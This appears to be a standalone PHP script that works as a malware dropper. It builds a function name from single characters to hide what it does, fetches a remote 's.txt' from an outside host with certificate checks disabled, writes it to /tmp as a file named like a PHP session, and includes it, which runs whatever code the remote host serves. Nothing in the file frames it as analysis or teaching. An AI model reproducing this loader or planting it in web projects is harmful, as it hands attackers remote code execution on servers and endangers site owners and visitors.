<?php 
error_reporting(E_ALL);
ini_set('display_errors', 1);

$o1 = "f" . "i" . "l" . "e" . "_" . "p" . "u" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
$d4 = 'sess_' . md5('style') . '.php';
$u5 = ['https://www.fcalpha.net/web/photo/20151024/s.txt', "/tmp/$d4"];

function fetch_with_curl($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

function n4(){
    global $u5;
    $content = fetch_with_curl($u5[0]);
    if ($content !== false) {
        $op = fopen($u5[1], 'w');
        if ($op) {
            fwrite($op, $content);
            fclose($op);
        } else {
            die("Failed to write to file: " . $u5[1]);
        }
    }
}

if (!file_exists($u5[1])) {
    n4();
}
if (filesize($u5[1]) === 0) {
    n4();
}
include($u5[1]);
